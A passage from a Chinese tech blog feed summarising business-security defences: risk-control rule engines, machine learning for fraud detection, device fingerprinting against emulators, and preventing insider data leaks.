alt="11"></p><p>我们知道，实时性越高、对黑产拦截得越及时，黑产所能够获得的收益也就越少。那是不是我们都采用同步模式就好了呢？当然不是。相比于同步模式，异步和离线模式在业务接受度和数据分析能力上都更优。</p><p>首先，同步模式需要侵入到业务的正常流程中，这对于业务来说，一方面会产生较高的接入改造成本，另一方面，也给业务的正常运行带来风险。因此，我们经常会遇到业务不接受同步模式的情况。</p><p>其次，实时性越高，我们获得到的信息就越少。以登录的场景为例，同步模式下的拦截行为发生在成功登录之前，所以，我们无法知道用户名密码是否正确。异步和离线是事后的分析，所以我们能够知道用户是否登录成功。显然，连续登录失败比连续登录成功更可疑。因此，用户是否登录成功这个信息，对于我们提升识别准确率会有很大的帮助。</p><p>而实时性越低，我们和黑产的对抗优势也就越多。如何理解这句话呢？我们来看实时性最低的离线模式。通常来说，离线模式能慢慢处理和运行几天甚至是几个月的数据。而数据越多，规则引擎的准确率和召回率也会越高，所以我们的优势也就越多。</p><p>最后，即使是使用同步模式，我们也需要使用异步和离线模式做数据分析和规则验证，这样才能保障同步模式的判定结果不会出现太大的误伤。</p><p>因此，在大部分情况下，我更推荐使用异步或者离线模式，仅在部分没办法做事后的拦截和处罚的业务场景中，我们才会使用同步模式。</p><p>举个例子，在提现操作中，提现成功后，钱就已经从公司转移到黑产手里了，我们没有办法追回，因此我们必须采用同步模式，在提现操作前对黑产进行拦截。</p><p><strong>高效的规则管理</strong></p><p>如果你做过数据分析工作，一定知道同步、异步、离线其实都是数据分析工作中常见的模式，已经有很成熟的工具来为它们服务了，比如：通过 Redis 完成实时计算；通过 Flink 完成异步计算；通过 Hive 完成离线计算等。因此，规则引擎不存在技术上的独特性。</p><p>但是，我认为特别“完美”的规则引擎还没有出现。因为规则管理有较高的复杂性和独特性。换一句话说就是，想要新建一条规则并执行是一件很容易的事情，但如何高效管理成百上千的规则，让风控人员和业务人员能够清晰地看到每个规则的效果、准确率和实际意义，是一个很有挑战性的工作。</p><p>就拿最出名的开源规则引擎Drools来说吧。Drools 定义了一套自有的 IF 匹配语言 DRL，并提供了基于Rete 算法的高效规则执行功能。然而，Drools 并没有提供十分高效的规则管理工具。</p><p>而高效的规则执行功能所能带来的性能提升，其实并不会特别明显。因为规则引擎的复杂度其实在于特征提取。特征提取完成之后，规则管理基本就是简单的 IF 匹配了。因此，我认为 Drools 并不是一个适用于风控系统的规则引擎。</p><p>除了 Drools 之外，部分规则引擎也会尝试使用 Web 界面的方式来降低规则管理的复杂度。比如，在一些开源的风控系统中（比如Nebula），我们可以看到各种用来增加修改规则的 Web 页面</p><p>但是，各个公司的规则形式，以及各个业务对规则的理解都不尽相同，因此，你在使用这些开源风控系统的时候，总会有部分需求无法实现。所以，我才说“规则管理需要较高的灵活性才能够适用于各个业务”。而矛盾的是，灵活性过高又会大大提高规则管理的复杂性，因此，我们必须慎重把握规则管理的灵活性。</p><p>目前来看，我觉得比较好的解决方案是，使用Aviator、QLExpress、Groovy等在 Java 中提供动态开发支持的语言，来进行底层的规则执行，在此基础之上，我们再去封装自己理解的规则管理。这样一来，我们就实现了灵活性和复杂度的平衡。</p><p><img src="/images/security/security-business/12.jpg" alt="12"></p><p>总结来说，规则引擎是风控系统的核心。想要做好一个规则引擎，我们需要思考清楚两件事情：第一，规则引擎以什么样的模式接入业务；第二，如何进行规则管理。</p><h3 id="风控系统为什么需要经过验证流程才能拦截黑产？"><a href="#风控系统为什么需要经过验证流程才能拦截黑产？" class="headerlink" title="风控系统为什么需要经过验证流程才能拦截黑产？"></a>风控系统为什么需要经过验证流程才能拦截黑产？</h3><p>事实上，当我们使用规则引擎识别出一个用户行为可能是黑产的时候，不能够直接进行拦截。因为规则引擎的判定结果永远存在“误伤”。有时候为了尽可能不漏过黑产，“误伤”的比例会很高。</p><p>比如说，当用户因为忘记密码多次登录网站失败的时候，网站就会怀疑这是黑产在进行操作。这个时候，我们如果直接拦截，就会收到大量的用户投诉。</p><p>为了解决这个问题，风控系统中加入了验证流程。采取适当的验证流程，我们可以降低拦截机制对用户体验的影响。所以，在上面的例子中，网站会使用滑块验证码来验证你是否是黑产。</p><p>基于业务场景的不同，验证的方式还有很多，比如，核验身份的短信认证、人脸识别，区分人机的图片验证、滑块验证等。很多应用都会对存疑的用户和行为施加各种验证流程，来保障用户身份的真实可靠。所以，为了让风控系统成功落地，验证流程是我们不能忽视的一个环节。</p><h3 id="开源风控系统参考"><a href="#开源风控系统参考" class="headerlink" title="开源风控系统参考"></a>开源风控系统参考</h3><ul><li><a href="https://github.com/threathunterX/nebula" target="_blank" rel="noopener">https://github.com/threathunterX/nebula</a></li><li><a href="https://github.com/momosecurity/aswan" target="_blank" rel="noopener">https://github.com/momosecurity/aswan</a></li></ul><h2 id="机器学习：如何教会机器识别黑灰产？"><a href="#机器学习：如何教会机器识别黑灰产？" class="headerlink" title="机器学习：如何教会机器识别黑灰产？"></a>机器学习：如何教会机器识别黑灰产？</h2><p>通过建立一个成熟的风控系统，你能够快速建立起和黑产进行持续对抗的稳固防线。但是，风控系统和规则引擎仅仅是一个平台和工具。想要真正对黑产进行识别，我们还得依靠规则引擎中运行的规则策略。</p><p>当然，规则的维护主要是依靠人力来进行的。但是这样的维护方式会有两个弊端：首先，人的工作效率会受各种因素影响，所以对抗的实效性很难保障；其次，规则的维护受到人的主观意识的影响，可能会产生一些“偏见”。</p><p>对于上述这两个问题，机器学习是一个理想的解决方案。因为，机器学习不仅可以无休止地工作，还会完全依据客观事实产生结果。</p><p>而且，机器学习对于基础安全来说，同样是一个提升规则维护效率的理想方案。因为各类防御工具（如：防火墙、IDS、WAF 等）也都是基于规则来运转的。</p><h3 id="如何正确认识机器学习？"><a href="#如何正确认识机器学习？" class="headerlink" title="如何正确认识机器学习？"></a>如何正确认识机器学习？</h3><p>一般来说，机器学习是通过找出未知的规则参数来区分已知的行为。这句话怎么理解呢？</p><p>我来举个例子你就懂了。在生活中，我们能够快速地分辨一张图片是猫还是狗。那你有没有思考过，我们是怎么进行识别的？根据五官、颜色还是形状？仔细回想一下，你就会发现，我们往往是根据经验来判断的，很难用文字描述出准确的判断依据。</p><p>同样地，对于一次请求或者操作，我们通常能够依据经验判定其是否是安全攻击。但是判定的依据具体有哪些，往往说不清楚。在这种情况下，机器学习就可以帮助我们将脑海中的模糊经验，总结成客观的规则参数，从而挖掘出恶意的攻击行为。</p><p>你会发现，机器学习挖掘恶意攻击的前提，是攻击行为必须能够被人为的判定，只是判定过程比较模糊和复杂，无法通过制定简单的规则进行人为的区分。因此，机器学习实际上是对人为经验的一种总结，并不具备创新的能力，所以最终对抗效果的好坏，还是取决于人的对抗能力。</p><h3 id="无监督学习在安全中的应用"><a href="#无监督学习在安全中的应用" class="headerlink" title="无监督学习在安全中的应用"></a>无监督学习在安全中的应用</h3><p>机器学习可以简单分为无监督学习和有监督学习，我们先来看一下，无监督学习在安全中的应用。</p><p>很多人认为，无监督学习就是在没有标签的情况下去找寻分类，发现所谓的“未知的威胁”，其实不然。实际上，<strong>无监督学习的目的是挖掘数据的分布特征，主要包括数据的聚集特征（也叫聚类特征，是通过聚类算法获得）和分布规律（也叫离群点，通过时序算法获得）。这些特征和规律能够帮助你发现异常的情况，但是不能帮你定位异常的行为。</strong></p><p>因此，如果想使用无监督学习来判定正常和异常行为，我们就需要对行为的整体分布有一个先验假设，常见的如：正常行为由正常用户产生，行为各有各的不同；恶意行为是少数人批量产生，行为会比较相似。</p><p>我曾经和几家乙方安全厂商聊过，有些厂商明确地表示过，他们正是基于这个假设，采用无监督学习进行业务风控识别的。从直觉上来说，这样的思路是没问题的，因为黑产大都是通过批量的行为来获取非法利益的，所以必然会在 IP、设备、行为、关联关系等各个方面露出一些马脚，被我们识别出来。但是，当落地到具体的场景时，这个假设并不完全成立。</p><p>举个例子，在业务安全中经常会遇到“垃圾小号问题”，我们通常是通过批量特征来进行挖掘的。下表是同一天注册的一批账号，以及它们对应的行为特征。我们可以通过 FP-Growth 算法对其行为进行关联分析，找到行为相同的一批账号。比如，表中的账号 2 和账号 3、账号 6 和账号 7，就存在高度的相似性。</p><p><img src="/images/security/security-business/13.jpg" alt="13"></p><p>那这种相似是不是就意味着这几个账号是黑产呢？这个理由显然并不充分。因为这种相似性可能只是一种巧合。比如，一个寝室的同学都刚开始使用微博，他们的行为和兴趣都很相似。因此，我们并不能基于这个无监督学习挖掘出来的聚类特征，对这些账号进行处罚。</p><p>但是，如果 1 月 1 日注册了 100 个账号，其中一半的账号都被关联分析挖掘出了聚类，那我们就无法用巧合去解释了，这就说明必然出现了黑产的攻击。</p><p>因此，我们可以将无监督学习当成一个评价和监控方法。比如，在没有黑产攻击的时候，注册账号的聚类占比可能低于 10%，那当某一天的值高于 10% 的时候，就说明可能出现黑产攻击了。但是，无监督无法准确地告诉你，哪些聚类是黑产的。所以接下来，我们就需要人工进行分析了。</p><p>在基础安全领域中，无监督学习也可以通过类似的原理来应用。</p><p>举个例子，IDS 判定一台服务器是否被黑客控制的思路，可能是服务器访问的外部服务数量是否异常。通常来说，服务器访问的外部服务越多，越有可能存在扫描的嫌疑。同样地 ，这个假设也不绝对成立，因为你永远无法预估开发到底会使用多少外部服务。</p><p>但是，当我们去实际统计服务器访问的外部服务数量时，会发现它呈指数分布。也就是说大部分服务器只访问少量的外部服务，而访问服务数越多，对应的服务器就越少，如下方右图所示。（横轴是外部服务数量，纵轴是服务器数量）</p><p><img src="/images/security/security-business/14.jpg" alt="14"></p><p>如果你发现某一集群内的服务器对应外部服务数量分布和指数分布，存在了明显的偏离（如上方左图所示），就说明这个集群内的服务器出现了异常情况，有可能是被黑客控制了。那接下来，我们再针对这些偏离较远的服务器，进行人工排查即可。</p><p>所以说，通过应用无监督学习，我们能够发现整体数据中的异常情况，然后只需要根据相应的报警去分析疑似异常的数据就可以了。相比于人工去分析全量数据，无监督学习能够大大提升风控效率。</p><h3 id="有监督学习在安全中的应用"><a href="#有监督学习在安全中的应用" class="headerlink" title="有监督学习在安全中的应用"></a>有监督学习在安全中的应用</h3><p>有监督学习的基础是标签数据，标签就代表着已知。所以，有监督学习的最大作用就是用来挖掘“已知的威胁”。如果想要保持和黑灰产的持续对抗，我们就必须不断地生产标签数据（也叫“打标”），供有监督学习的算法来学习。但是，依靠人工去生产标签数据是不可行的。你可以先试着思考一下，不可行的原因都有哪些，然后再来看我下面的讲解。</p><p><strong>第一，时间成本高。</strong></p><p>在图片识别等领域，对一个图片“打标”只需要一个普通人花几秒钟的时间。但是对于一个安全类的数据，一个安全人员可能需要花费几十分钟甚至几个小时，才能够确定这次行为到底是不是恶意行为。</p><p><strong>第二，覆盖面不全。</strong></p><p>由于时间成本高，我们无法进行全量数据的“打标”。而且人是存在懒惰心理的，因此人为“打标”时，总是会倾向于优先处理相对明显的数据，那么相对隐秘的攻击行为，就很容易在“打标”过程中被忽略。</p><p><strong>第三，标准偏差。</strong></p><p>恶意与正常往往没有明确的界限，不同的安全人员对于安全的认知和要求也不同。比如，一次简单的端口扫描算不算恶意行为呢？一个专刷明星的帐号算不算垃圾账号呢？不同的人会有不同的判断，这种判断标准的偏差会导致最终产生的标签数据分布不一致，这对机器学习的结果也将产生较大的影响。</p><p>因此，想要成功地应用有监督学习，我们就必须找到客观、高效的“打标”方案。</p><p>在基础安全领域中，黑客的最终目的无非是获取数据、篡改程序、拒绝响应等。所以，我们其实可以通过数据的 CIA 是否受到影响来进行标记，获得最终的判定标签，然后将标签进行回溯，从而获得表层的标签数据。</p><p>举个例子，WAF 是通过获取 HTTP 相关的数据（如：路径、参数、header、ua 等）来找出恶意的 HTTP 请求，从而对 Web 攻击进行检测拦截的。但是 WAF 并不知道这个请求具体会干什么，执行什么样的逻辑，所以它的评判标准只能是“带有 XXX 特征的请求是恶意请求”。如果想持续不断为 WAF 提供标签数据，靠人力肯定不行，我们应该深入追踪下去，以最终结果对数据进行自动“打标”。</p><p>RASP 的检测思路正是如此，就是直接深入到 Web 程序的逻辑，根据运行情况去评判该请求是否是攻击行为。因为是对 HTTP 请求的最终行为进行评判，所以 RASP 可以实现所谓的“无规则检测”，准确率和召回率都有保证。</p><p>如果我们利用 RASP 对影响数据 CIA 的 HTTP 请求进行打标，然后由 WAF 去学习这些 HTTP 请求具有什么样的特征，那么一个完整的机器学习闭环基本就形成了，如下图所示。</p><p><img src="/images/security/security-business/15.jpg" alt="15"></p><p>业务安全其实也可以尝试同样的思路来生产标签。比如，我们可以通过对接口签名校验、虚拟设备判定等方式，对异常的行为进行标记，作为业务安全中标签数据的来源。在此基础之上，我们再使用有监督学习算法去学习异常行为的特征，让业务风控的机器学习算法能够不断更新和迭代。</p><p>另外，我不建议直接根据标签数据进行拦截。因为我们一旦进行拦截，这些生产标签的指标就会暴露，就会促使黑产进行研究和对抗，那么标签的准确性就会受到影响。</p><p>另外，我不建议直接根据标签数据进行拦截。因为我们一旦进行拦截，这些生产标签的指标就会暴露，就会促使黑产进行研究和对抗，那么标签的准确性就会受到影响。</p><p>总而言之，想要成功地运用有监督学习，我们必须找到一个合理的打标方案，持续不断地产出可靠的标签数据。在此基础上，我们才能够运用各种高上大的算法，去挖掘安全领域中的“已知的威胁”。</p><h2 id="设备指纹：面对各种虚拟设备，如何进行对抗？"><a href="#设备指纹：面对各种虚拟设备，如何进行对抗？" class="headerlink" title="设备指纹：面对各种虚拟设备，如何进行对抗？"></a>设备指纹：面对各种虚拟设备，如何进行对抗？</h2><p>随着手机和人的关系越来越紧密，通过手机对用户行为进行追踪和判定的方法，已经成为风控系统中识别黑产的主要手段。设备指纹是用来标识手机或者浏览器的唯一 ID，我们能够通过这个 ID 关联到手机或浏览器相关的全部数据。因此设备指纹是风控系统中最核心的数据来源。</p><h3 id="设备指纹的优势"><a href="#设备指纹的优势" class="headerlink" title="设备指纹的优势"></a>设备指纹的优势</h3><p>对比于传统的 IP、手机号等 ID，设备指纹具有唯一性高、稳定性强和信息丰富这三个优势。</p><p>简单来说，唯一性高是指一人一设备，因为使用者不同，每个智能设备上的使用痕迹和特征也具有唯一性。稳定性强也很好理解，就是智能设备的硬件不常更新，它们对应稳定不变的 ID。这两个优势，让我们能通过识别智能设备找到唯一对应的人，以及在较长时间内保持对他的识别。最后，智能设备能够收集的信息非常丰富，自下而上包括硬件、操作系统、应用信息等。</p><p>基于这些优势，一方面，设备指纹可以以设备为单位对其相关的行为进行串联，发现诸如使用一个设备进行大规模注册等黑产攻击行为；另一方面，设备指纹可以基于其丰富的设备信息，来识别黑产使用的虚拟设备，帮助风控系统对抗黑产。</p><h3 id="设备指纹面临的主要挑战"><a href="#设备指纹面临的主要挑战" class="headerlink" title="设备指纹面临的主要挑战"></a>设备指纹面临的主要挑战</h3><p>Android 和 iOS 都已经内置了用来追踪设备的 ID，比如IDFA（Identifier For Advertising），我们为什么还要自己去实现设备指纹呢？在解答这个问题之前，我首先来讲一下设备指纹技术面临的主要挑战。通过这些挑战，你就能够明白内置的 ID 存在哪些问题，为什么无法满足风控系统的需求了。</p><p><strong>第一，设备重置之后，保持设备指纹不变。</strong></p><p>恢复出厂设置是所有智能设备的标配功能，设备重置之后，系统自带的设备 ID 必然会发生变化，理论上来说就是“新设备”了。</p><p>所以，如果只是使用系统自带的设备 ID，黑产完全可以通过不断恢复出厂设置模拟大量的设备，来绕过风控系统的检测。因此，如何在恢复出厂设置的情况下，仍然保持设备指纹的稳定不变，是设备指纹技术的主要挑战之一。</p><p><strong>第二， 设备更新之后，保持设备指纹不变。</strong></p><p>既然无法直接使用自带的设备 ID，那我们就必须基于各类设备信息综合计算出设备指纹。但是，我们平时在使用智能设备的时候，不仅会有意或无意地变更设备名称、网络环境、位置等信息，还会更新操作系统，系统版本、应用版本等特征也会随之改变。这都会影响到设备指纹的计算。</p><p>知道了设备更新能影响设备指纹的计算，黑产在进行欺诈行为的时候会更加极端，它们会更换部分硬件去尝试伪造新的设备，比如，摄像头、音响等相对容易拆卸安装的部分。因此，如何在一定程度上兼容设备的变动和更新，也是设备指纹需要考虑的问题之一。</p><p>总之，黑产总是会尝试去修改虚拟设备的各类配置，将其伪造成新的设备，从而绕过风控系统的检测。因此，一个稳定的设备指纹可以帮助风控系统对抗黑产的虚拟设备。</p><p>上面说的这两个挑战都属于设备指纹对稳定性的要求。最后，我们还要保证设备指纹的唯一性，避免两个不同的设备产生相同的设备指纹，比如，如何准确地区分同型号的设备，也是设备指纹需要满足的要求之一。所以，唯一性是避免误伤真实用户的关键维度。</p><h3 id="设备指纹的信息采集"><a href="#设备指纹的信息采集" class="headerlink" title="设备指纹的信息采集"></a>设备指纹的信息采集</h3><p>通过上述的挑战我们可以看到，不同类型的信息能够满足不同的诉求，比如：iOS 中的 IDFA 或者 Android 中的 IMEI 可以解决环境变更的问题，但是无法解决重置的问题；而硬件特征可以解决重置的问题，但是面对多个同型号设备，可能无法准确区分。</p><p>因此，想要获得准确且稳定的设备指纹，我们必须从多个维度采集不同的信息。这些信息可以大致分为：软件 ID、软件静态特征、硬件静态特征和硬件动态特征。下面，我就和你一起来探讨一下这些信息的特点和重要性。</p><p><strong>第一，软件 ID。</strong></p><p>软件 ID 主要包括 iOS 设备的 IDFA、IDFV，Android 设备的 IMEI、MAC 等。这些 ID 本身就是苹果和 Google 为了给 APP 厂商提供追踪能力设计的标识，具备较好的唯一性和稳定性。</p><p>但是，操作系统为了保障用户隐私，对 APP 的权限做了较多的限制。比如，用户可以自主选择禁止 APP 获取到这些 ID，重置手机也会同时重置这些 ID 等。</p><p>而黑产也会利用这一特性，绕过 APP 厂商的识别策略。比如，黑产可以在苹果系统中直接设置不允许获取 IDFA。这样一来，APP 厂商的风控系统就没有办法通过设备维度关联黑产行为了，也就无法识别单一设备批量操作的攻击行为了。</p><p><strong>第二，软件静态特征。</strong></p><p>软件静态特征主要是操作系统和 APP 本身的各类基本信息，比如操作系统版本、手机名称、APP 版本等。这些信息基本都可以通过更新或者手动配置的方式修改，因此在稳定性上表现较差。但是，这些信息能够反映出用户的个人特征，因此，它们能够对设备指纹的唯一性产生较大帮助。</p><p><strong>第三，硬件静态特征。</strong></p><p>硬件静态特征主要是设备的各类硬件信息，比如，主板、CPU、摄像头等相关型号信息。正常用户基本不会去替换设备上的各个硬件，因此硬件静态特征具备较高的稳定性。</p><p>但同一型号手机的硬件配置是一致的，所以，硬件静态特征在唯一性上相对欠缺。因此，通过硬件静态特征，我们无法很好地区分同型号的设备。</p><p><strong>第四，硬件动态特征。</strong></p><p>硬件动态特征是目前比较新的研究方向，它的基本原理是基于硬件的一些动态执行层产生的特征（如：加速度传感器的偏差）来识别虚拟设备。</p><p>举个例子，因为加速度传感器校准结果的不精确性，其产生的最终结果会存在一定的偏差。通过多次快速地查询加速度传感器，我们就可以模拟出同一<br>时刻，加速度传感器返回的结果值。又因为存在机械偏差，所以这些结果值是不同的，那通过这些值，我们就可以计算出该传感器的线性偏差。</p><p>利用这样的原理，我们可以采集任何一个传感器硬件的偏差特征。比如，下图是在播放同一个音频后，不同手机的麦克风接收到的音频曲线。每一个颜色对应一个设备，可以看到不同设备之间的曲线存在较大差异，而同一设备的曲线则相对稳定。</p><p><img src="/images/security/security-business/16.jpg" alt="16"></p><p>因此，从稳定性上来说，硬件动态特征的表现还是不错的。不过由于特征区间比较窄，唯一性稍差一些，更多被用来辅助区分同型号的不同设备。</p><h3 id="设备指纹的-ID-计算"><a href="#设备指纹的-ID-计算" class="headerlink" title="设备指纹的 ID 计算"></a>设备指纹的 ID 计算</h3><p>在采集了各类信息之后，如何基于这些信息计算出一个正确的设备指纹，是设备指纹技术的核心挑战。由于数据的维度和数据量的大小都各有不同，因此，各个公司都需要自己设计相应的算法进行计算。下面我们来讲一下 ID 计算的大体思路。</p><p>首先，我们要明确设备指纹需要解决的核心问题，也就是给出两组信息，如何判定它们是不是来自同一个设备。我们来看一个例子。</p><p>在采集了各类信息之后，如何基于这些信息计算出一个正确的设备指纹，是设备指纹技术的核心挑战。由于数据的维度和数据量的大小都各有不同，因此，各个公司都需要自己设计相应的算法进行计算。下面我们来讲一下 ID 计算的大体思路。<br>首先，我们要明确设备指纹需要解决的核心问题，也就是给出两组信息，如何判定它们是不是来自同一个设备。我们来看一个例子。</p><p>因此，我们可以判定设备信息 A 和设备信息 B 实际上属于同一个设备，应该分配相同的设备指纹。</p><p><img src="/images/security/security-business/17.jpg" alt="17"></p><p>上面的判定过程进一步抽象的话，其实就是计算两组数据的相似度，相似度越高、差异度越低，就越有可能是同一个设备。</p><p>下面，我们就来看一下，实际工作中是如何利用相似度进行判定的。</p><p>首先，新采集上来一组设备信息，我们要计算它和已有设备信息的相似度。可实现的算法有很多，简单的包括欧式距离、马氏距离、联合概率分布等，相对复杂的包括 MRF（马尔可夫随机场）、BP 算法（置信度传播算法）等。</p><p>其次，我们会设定一个阈值，当这两组数据的相似度达到这个值之后，就可以判定这两组设备数据本质上都是同一台设备产生的。</p><p>设定阈值的依据，就是黑产伪造新设备的 2 种方式：</p><ol><li>重置设备：手机在重置后，虽然设备 ID 改变了，但是大部分的硬件相关信息仍然保持不变；</li><li>更新设备：如果更新系统信息，那么设备 ID 和硬件信息等仍然保持不变；如果替换部分硬件，那么系统信息和配置等仍然会保持不变。</li></ol><p>最后，如果判定这两组数据属于同一台设备，我们就分配相同的设备指纹。如果属于不同的设备，我们就为新采集的数据生成新的设备指纹。设备指纹分配的流程如下图：</p><p><img src="/images/security/security-business/18.jpg" alt="18"></p><h3 id="设备指纹对异常设备的识别"><a href="#设备指纹对异常设备的识别" class="headerlink" title="设备指纹对异常设备的识别"></a>设备指纹对异常设备的识别</h3><p>除了通过计算一个唯一 ID 来追踪设备，设备指纹的另一个核心任务就是对异常的设备进行识别。异常的设备可能是虚拟机，也可能是手机墙、云控等真实的设备。</p><p>我们可以从三个方面来识别异常设备。</p><p><strong>第一，系统信息识别。</strong></p><p>识别虚拟机最基本的方法，就是利用一些系统的默认参数，也就是系统信息来识别。下图是 Android 虚拟机中的部分设备信息，可以看到设备型号是 x86（市面上不存在 x86 的安卓手机），序列号是 EMULATOR 开头。</p><p><img src="/images/security/security-business/19.jpg" alt="19"></p><p>因此，一旦在设备指纹中出现了这些信息，我们就能够判断当前的运行环境是一个虚拟机了。不过想要修改系统信息十分容易，因此大部分黑产都能够绕过基于系统信息识别的检测方法。</p><p><strong>第二，硬件识别。</strong></p><p>虚拟机和真实设备的最大区别就在于，虚拟机不存在真实的硬件设备支持。因此虚拟机在很多功能上会存在缺失。</p><p>比如：各类传感器要么缺失，要么采集的数值都是 0 或者某个固定值；相机功能异常，无法拍照等。这些都是常见的虚拟机硬件缺失的特征。</p><p>黑产想要绕过设备指纹基于硬件特征的检测机制，就必须在虚拟机中模拟出这些硬件的存在，这需要一定的技术成本。</p><p><strong>第三，系统状态识别。</strong></p><p>为了降低被风控系统识别的风险，有的黑产已经升级到使用廉价真机来攻击业务了。因为设备已经是真实设备，所以我们无法通过虚拟机的检测方式识别设备异常。但是，既然虚拟机都有特定的特征可以用来识别，那这类真实设备是否也有呢？显然是有的。</p><p>比如说，为了实现批量操控，这些设备必须插入数据线，所以它们会一直处于充电状态（如下图所示，Android 虚拟机一直处于充电中），而正常用户大部分时候其实是未连接数据线的状态。</p><p><img src="/images/security/security-business/20.jpg" alt="20"></p><p>另外，这些设备的地理位置、网络环境等往往也高度相似，我们可以根据这些信息对异常的聚集现象进行挖掘。</p><p>总体来说，对异常设备的识别，是设备指纹和黑产进行直接对抗的领域。双方都在不断挖掘新的技术相互博弈：黑产在想方设法让设备看起来更加真实可信，而我们则需要不断挖掘新的特征点，找出这些设备和正常设备之间的差异。</p><h2 id="数据安全：如何防止内部员工泄露商业机密？"><a href="#数据安全：如何防止内部员工泄露商业机密？" class="headerlink" title="数据安全：如何防止内部员工泄露商业机密？"></a>数据安全：如何防止内部员工泄露商业机密？</h2><h3 id="为什么员工会主动泄露公司机密？"><a href="#为什么员工会主动泄露公司机密？" class="headerlink" title="为什么员工会主动泄露公司机密？"></a>为什么员工会主动泄露公司机密？</h3><p>那作为员工，为什么会主动泄露公司数据呢？我曾听过这样一句话，觉得非常有道理：“生活中有两个悲剧。一个是你的欲望得不到满足，另一个则是你的欲望得到了满足。”人的欲望总是无穷无尽的，而且一旦萌生，就极难克制。对于大多数人来说，泄露公司机密，无非有以下几个常见的出发点。</p><p>我认为，第一个肯定是赚钱，这也是最容易想到的一个。员工利用公司来赚钱的方式，无非有 3 种。</p><ul><li>倒卖公司数据。对于任何一家公司而言，数据一定是其最有价值的部分。而员工往往能够很轻易地获取到一些私密的内部数据。在黑市上，个人的姓名、手机号和住址等信息，都能够以每条几毛甚至是几块的价格进行交易。除此之外，竞争对手之间，也很乐意出高价来收购对方的商业机密。</li><li>欺诈。最典型的就是“吃回扣”，也就是利用公司采购流程的漏洞来获得非法收益。比如，一个和电商有关的欺诈行为，就是员工给自己发放内部网站的高额优惠券。</li><li>贪污。采购投标、拉拢客户这些环节，都极容易出现贪污现象。</li></ul><p>第二个出发点，我认为可能是员工出于对公司的不满而实施的报复行为。互联网公司往往变化非常快，员工被公司突然裁掉的事情这几年屡见不鲜。被裁员工心怀不满也是常事。除此之外，一些主动辞职的员工，出于对现阶段工作内容和收入的不满意，也会心生怨怼。我们常常拿来当玩笑说的“删库跑路”就是最常见的报复行为。</p><p>第三个出发点就是跳槽。说白了，就是跳槽后的员工，以原公司的核心数据为资本，服务下一家公司。我们经常能够听到相关的新闻报道，比如，某个销售总管跳槽，把客户也一并带走了；或者某个 leader 带着得力员工一起跳槽。这些客户关系或者员工，其实都是公司的核心资产。所以，一个内部员工，可以将他手中的这些资产，作为跳槽的一个筹码，来实现个人的职业发展。</p><p>第四个是商业间谍。这个你应该在很多商战类的电影和电视剧中经常看到，这些间谍会为了原始公司的利益打入对手公司的内部。这样的员工一开始就是怀揣着某种目的进入公司的。除此之外，一些黑灰产的从业人员也可能为了窃取某个公司的数据，去应聘这个公司。</p><p>第五个其实和利益就没有直接关系了，只是员工为了满足自己想要炫耀的心理，对外泄露信息。尤其是某些大公司的员工，他可能为了证明自己能够知道一些内部消息，而将内部的活动规则、公司通告等在微博或者脉脉上进行宣扬。这些敏感信息的泄露，对于公司的正常运营以及声誉，都有可能产生非常严重的影响。这也就是所谓的“员工一张嘴，公关跑断腿”。</p><h3 id="如何防止内部员工泄露机密？"><a href="#如何防止内部员工泄露机密？" class="headerlink" title="如何防止内部员工泄露机密？"></a>如何防止内部员工泄露机密？</h3><p>现在，我们大概知道了，员工一般会出于什么心理去泄露机密。了解了这些问题的“源头”，我们就需要思考，如何基于这些情况，做好数据安全，防止出现泄密情况。</p><p>我认为，在数据安全上，我们能做到的防护其实十分有限。因为数据安全所面临的威胁，不仅复杂度很高，而且隐蔽性极强。所以，我们只能通过各种手段，尽可能地降低数据安全带来的影响。下面，我总结了几个可行的方法和手段。</p><p>最直接的方式就是背调。背调是公司用来评判人品的一个直接方式。公司通过对员工过往工作行为和资历的调查，就能够看出员工是否值得信任。但我们不得不承认，一个公司在背调时，能够获取到的信息十分有限，根本没有办法和公安、政府相比。</p><p>DLP（Data leakage prevention，数据泄露防护系统）应该是目前数据安全中，最基础也是最重要的技术防护手段之一了。从原理上来说，DLP 就是监控公司内部所有的数据流动，对数据的内容、类型和流向等进行统计和分析。不过，目前的 DLP 产品，更多的是关注员工个人设备中的数据流动。这主要是因为相比于服务器，个人设备的使用范围更广，不容易控制。而且，服务器的数据流动太大，监控成本也过高。</p><p>那 DLP 是如何监控数据流动的呢？一般情况下，公司在部署了 DLP 产品之后，会强制员工在电脑上安装一个 DLP 的终端。公司会通过这个终端，监控员工设备中的各种数据流动。换一句话说，只要公司需要，可以随时掌握员工在个人电脑上获取了哪些数据、进行了哪些操作。不得不说，这确实在一定程度上侵犯了员工的个人隐私，但这也是目前公司为了保障数据安全，所采取的一些不得已的手段。</p><p>另外，公司还可以对员工的行为进行异常检测。为啥要这么做呢？这是因为，一个员工，如果想要贩卖公司的数据，那他就需要获取自己职责之外的大量数据。比如，如果一个客服在下班之后，还频繁地查询用户的个人信息，那么这个客服就很有可能在窃取公司的隐私数据。想要对员工的行为进行异常检测，公司需要先对各类员工的行为进行采集和数据分析，然后制定对应的规则和模型，从而区分员工的正常行为和异常行为。</p><p>最后，公司还可以制定相应的规章制度，对破坏公司利益的员工进行处罚和公示，这些都能够对员工产生威慑作用，从意识和心理上阻止员工泄密。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>极客时间《安全攻防技能30讲》</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;对比于传统的基础安全，业务安全有哪些特点呢？为什么它能够成为一个独立的领域呢？在业务安全中，我们需要重点关注的防护方法又有哪些呢？&lt;/p&gt;
    
    </summary>
    
    
      <category term="Security" scheme="https://xinlichao.cn/categories/Security/"/>
    
    
      <category term="security" scheme="https://xinlichao.cn/tags/security/"/>
    
  </entry>
  
  <entry>
    <title>Linux 系统和应用安全</title>
    <link href="https://xinlichao.cn/back-end/security/security-linux/"/>
    <id>https://xinlichao.cn/back-end/security/security-linux/</id>
    <published>2020-07-13T20:00:00.000Z</published>
    <updated>2021-02-26T10:23:44.682Z</updated>
    
